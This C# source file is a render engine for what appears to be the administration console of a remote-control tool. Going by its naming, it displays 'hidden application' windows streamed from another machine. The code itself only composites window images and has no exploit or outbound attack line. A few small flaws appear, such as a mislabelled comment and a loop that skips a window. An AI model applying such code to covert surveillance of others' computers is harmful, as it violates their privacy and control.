using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using Orcus.Administration.Commands.Native;
using Orcus.Shared.Commands.HiddenApplication;

namespace Orcus.Administration.Commands.HiddenApplication
{
    public class RenderEngine : IDisposable
    {
        private readonly RequestInformationDelegate _requestInformationDelegate;
        private readonly object _listLock = new object();
        private readonly object _renderLock = new object();
        private readonly object _renderProcessLock = new object();

        private bool _isDisposed;
        private readonly AutoResetEvent _updateReceivedAutoResetEvent;

        public delegate void RequestInformationDelegate(long handle);

        public RenderEngine(RequestInformationDelegate requestInformationDelegate)
        {
            _requestInformationDelegate = requestInformationDelegate;
            Windows = new List<WindowRenderInfo>();
            _updateReceivedAutoResetEvent = new AutoResetEvent(false);
        }

        public void Dispose()
        {
            if (_isDisposed)
                return;

            _isDisposed = true;

            IsStarted = false;

            lock (_listLock)
            {
                foreach (var windowRenderInfo in Windows)
                    windowRenderInfo.Dispose();
                Windows.Clear();
            }

            _updateReceivedAutoResetEvent.Dispose();
        }

        public event EventHandler<double> FrameRatePerSecondUpdate;

        public List<WindowRenderInfo> Windows { get; private set; }
        public WriteableBitmap WriteableBitmap { get; private set; }
        public bool IsStarted { get; private set; }

        public void Start()
        {
            if (IsStarted)
                return;

            IsStarted = true;
            RenderLoop();
        }

        public void Stop()
        {
            if (!IsStarted)
                return;

            lock (_renderProcessLock)
                lock (_renderLock)
                    IsStarted = false;
        }

        private async void RenderLoop()
        {
            var priorityList = new Dictionary<WindowRenderInfo, int>();
            var stopwatch = Stopwatch.StartNew();
            var framesRendered = 0d;
            while (IsStarted)
            {
                lock (_renderProcessLock)
                {
                    priorityList.Clear();
                    lock (_listLock)
                    {
                        var now = DateTime.Now;
                        var visibleWindows = Windows.Where(x => x.Height > 0 && x.Width > 0).ToList();
                        for (int i = 0; i < visibleWindows.Count; i++)
                        {
                            var window = visibleWindows[i];
                            if (i == 0) //foreground window should be redrawn as often as possible
                            {
                                priorityList.Add(window, 1);
                                continue;
                            }

                            //update all windows at least every 15 seconds
                            //windows which have a lower Z index (and are more visible) get have a higher priority
                            if ((now - window.LastUpdate).TotalSeconds > 15 ||
                                window.LastUpdate == DateTime.MinValue && !priorityList.ContainsKey(window))
                                priorityList.Add(window, (visibleWindows.Count - i) * 5);
                        }
                    }

                    var windowToRender = priorityList.OrderByDescending(x => x.Value).FirstOrDefault().Key;
                    _requestInformationDelegate(windowToRender?.Handle ?? 0);
                }

                try
                {
                    if (!await Task.Run(() => _updateReceivedAutoResetEvent.WaitOne()))
                        continue;
                }
                catch (Exception)
                {
                    continue;
                }

                if (!IsStarted)
                    return;

                RenderFrame();
                framesRendered++;

                if (stopwatch.ElapsedMilliseconds > 1000)
                {
                    FrameRatePerSecondUpdate?.Invoke(this,
                        framesRendered / (stopwatch.ElapsedMilliseconds / 1000d));
                    framesRendered = 0;
                    stopwatch.Restart();
                }
            }
        }

        private void RenderFrame()
        {
            lock (_renderLock)
            {
                var x = 0;
                var y = 0;
                var height = 0;
                var width = 0;

                x = Windows.OrderBy(w => w.X).First().X; //find smallest X
                y = Windows.OrderBy(w => w.Y).First().Y; //find greatest Y

                width = Windows.Select(w => w.X + w.Width).OrderByDescending(w => w).First() - x; //find greatest X + width and substract the X
                height = Windows.Select(w => w.Y + w.Height).OrderByDescending(w => w).First() - y; //find greatest Y + height and substract the Y

                if (width != WriteableBitmap.Width || height != WriteableBitmap.Height)
                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        WriteableBitmap = new WriteableBitmap(width, height, 96, 96,
                            PixelFormats.Bgr24, null);
                    });

                using (var finalImage = new Bitmap(width, height))
                using (var graphics = Graphics.FromImage(finalImage))
                {
                    lock (_listLock)
                        for (int i = Windows.Count - 1; i-- > 0;)
                        {
                            var window = Windows[i];
                            if (window.Image != null)
                            {
                                lock (window.RenderLock)
                                {
                                    if (window.Image != null)
                                        graphics.DrawImage(window.Image,
                                            new System.Drawing.Point(window.X - x, window.Y - y));
                                    else
                                        graphics.DrawRectangle(
                                            new System.Drawing.Pen(System.Drawing.Color.FromArgb(40, 41, 128, 185)),
                                            window.X - x, window.Y - y, window.Width, window.Height);
                                }
                            }
                        }

                    var bitmapData = finalImage.LockBits(new Rectangle(0, 0, finalImage.Width, finalImage.Height),
                        ImageLockMode.ReadOnly,
                        System.Drawing.Imaging.PixelFormat.Format24bppRgb);

                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        WriteableBitmap.Lock();
                        NativeMethods.CopyMemory(WriteableBitmap.BackBuffer, bitmapData.Scan0,
                            WriteableBitmap.BackBufferStride * finalImage.Height);

                        WriteableBitmap.AddDirtyRect(new Int32Rect(0, 0, finalImage.Width, finalImage.Height));
                        WriteableBitmap.Unlock();
                    });

                    finalImage.UnlockBits(bitmapData);
                }
            }
        }

        public void UpdateFailed()
        {
            if (_isDisposed)
                return;

            _updateReceivedAutoResetEvent.Set();
        }

        public void Update(WindowPackage windowUpdate)
        {
            if (_isDisposed)
                return;

            lock (_listLock)
            {
                foreach (var windowInformation in windowUpdate.Windows)
                    Windows.FirstOrDefault(x => x.Handle == windowInformation.Handle)?.UpdateData(windowInformation);

                foreach (var windowInformation in windowUpdate.Windows)
                    if (Windows.All(x => x.Handle != windowInformation.Handle))
                        Windows.Add(new WindowRenderInfo(windowInformation));

                foreach (var windowToRemove in Windows.Where(x => windowUpdate.Windows.All(y => y.Handle != x.Handle)).ToList()) //ToList is important to allow removing from the list
                    Windows.Remove(windowToRemove);

                if (windowUpdate.WindowData != null)
                {
                    var windowToUpdate = Windows.FirstOrDefault(x => x.Handle == windowUpdate.WindowHandle);
                    windowToUpdate?.UpdateImage(windowUpdate.WindowData);
                }
            }

            _updateReceivedAutoResetEvent.Set();
        }
    }
}
